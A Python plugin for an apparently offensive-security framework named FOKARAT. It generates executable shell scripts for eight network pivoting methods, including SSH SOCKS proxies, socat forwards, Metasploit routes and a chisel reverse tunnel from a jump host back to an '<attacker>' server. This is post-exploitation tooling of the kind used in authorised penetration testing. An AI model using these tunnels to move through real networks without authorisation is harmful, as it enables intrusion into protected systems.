"""
FOKARAT - Pivoting & Tunneling
SOCKS proxy, port forwarding, tunnels.
"""
import os
from sdk import PluginBase, PluginMetadata


class Pivoting(PluginBase):
    """Génère des commandes de pivoting."""

    METHODS = {
        "ssh_socks": {
            "name": "SSH Dynamic SOCKS Proxy",
            "usage": "ssh -D 1080 -N -f user@target",
            "notes": "Crée un proxy SOCKS5 local sur le port 1080.",
            "requires": "ssh",
        },
        "ssh_local_forward": {
            "name": "SSH Local Port Forward",
            "usage": "ssh -L <local_port>:<target>:<remote_port> user@jump_host",
            "notes": "Redirige un port local vers un service distant.",
            "requires": "ssh",
        },
        "ssh_remote_forward": {
            "name": "SSH Remote Port Forward",
            "usage": "ssh -R <remote_port>:<local_target>:<local_port> user@jump_host",
            "notes": "Redirige un port distant vers un service local.",
            "requires": "ssh",
        },
        "chisel": {
            "name": "Chisel (SOCKS via HTTP)",
            "usage": "chisel server -p 8080 --reverse\nchisel client <server>:8080 R:socks",
            "notes": "Proxy SOCKS via HTTP/WebSocket, très rapide.",
            "requires": "chisel",
        },
        "ligolo": {
            "name": "Ligolo-ng (TUN)",
            "usage": "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
            "notes": "Pivot via TUN (interface réseau virtuelle).",
            "requires": "ligolo-ng",
        },
        "socat": {
            "name": "Socat Port Forward",
            "usage": "socat TCP-LISTEN:<local_port>,fork TCP:<target>:<remote_port>",
            "notes": "Redirection simple via socat.",
            "requires": "socat",
        },
        "metasploit_route": {
            "name": "Metasploit Route",
            "usage": "route add <subnet> <session_id>",
            "notes": "Ajoute une route via une session Meterpreter.",
            "requires": "msf",
        },
        "proxychains": {
            "name": "Proxychains",
            "usage": "proxychains4 <command>  # avec socks5 127.0.0.1 1080 dans /etc/proxychains4.conf",
            "notes": "Force une commande à passer par le proxy SOCKS.",
            "requires": "proxychains4",
        },
    }

    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="Pivoting",
            version="1.0.0",
            author="FOKAS",
            description="8 méthodes de pivoting/tunneling.",
            category="c2",
            tags=["pivot", "tunnel", "socks"],
            requires_scope=True,
            target_param="target",
        )

    def _execute(self, config, args=None) -> dict:
        if not args or not isinstance(args, dict):
            return {"status": "error", "message": "args requis"}

        target = args.get("target")
        method = args.get("method", "ssh_socks")
        local_port = args.get("local_port", 1080)
        user = args.get("username", "root")
        jump_host = args.get("jump_host", target)

        if method not in self.METHODS:
            return {
                "status": "error",
                "message": f"Méthode '{method}' inconnue",
                "available": list(self.METHODS.keys()),
            }

        m = self.METHODS[method]
        cmd = self._build_command(method, target, user, jump_host, local_port)

        out_dir = config.get("output_dir", "output")
        os.makedirs(out_dir, exist_ok=True)
        script_path = os.path.join(out_dir, f"pivot_{method}.sh")

        with open(script_path, "w", encoding="utf-8") as f:
            f.write(f"#!/bin/bash\n# FOKARAT Pivot: {method}\n# Target: {target}\n\n{cmd}\n")
        os.chmod(script_path, 0o755)

        return {
            "status": "success",
            "method": method,
            "method_name": m["name"],
            "usage": m["usage"],
            "notes": m["notes"],
            "requires": m["requires"],
            "command": cmd,
            "script_path": script_path,
            "target": target,
        }

    def _build_command(self, method, target, user, jump, port) -> str:
        if method == "ssh_socks":
            return f"ssh -D {port} -N -f {user}@{jump}\n# Puis : proxychains4 <cmd>  ou  curl --socks5 127.0.0.1:{port} ..."
        if method == "ssh_local_forward":
            return f"ssh -L {port}:{target}:{port} {user}@{jump} -N -f"
        if method == "ssh_remote_forward":
            return f"ssh -R {port}:localhost:{port} {user}@{jump} -N -f"
        if method == "chisel":
            return (
                f"# Sur le serveur (attaquant) :\n"
                f"chisel server -p 8080 --reverse\n\n"
                f"# Sur le client (jump host) :\n"
                f"chisel client <attacker>:8080 R:socks"
            )
        if method == "ligolo":
            return (
                f"# Sur l'attaquant :\n"
                f"sudo ip tuntap add user $(whoami) mode tun ligolo\n"
                f"sudo ip link set ligolo up\n"
                f"ligolo-proxy -selfcert -laddr 0.0.0.0:11601"
            )
        if method == "socat":
            return f"socat TCP-LISTEN:{port},fork,reuseaddr TCP:{target}:{port}"
        if method == "metasploit_route":
            return f"# Dans msfconsole :\n# route add <subnet> <session_id>"
        if method == "proxychains":
            return f"# Configurer /etc/proxychains4.conf :\n# socks5 127.0.0.1 {port}\nproxychains4 <command>"
        return "# Commande non générée"

    def list_methods(self) -> list:
        return [{"id": k, "name": v["name"], "usage": v["usage"],
                 "notes": v["notes"], "requires": v["requires"]}
                for k, v in self.METHODS.items()]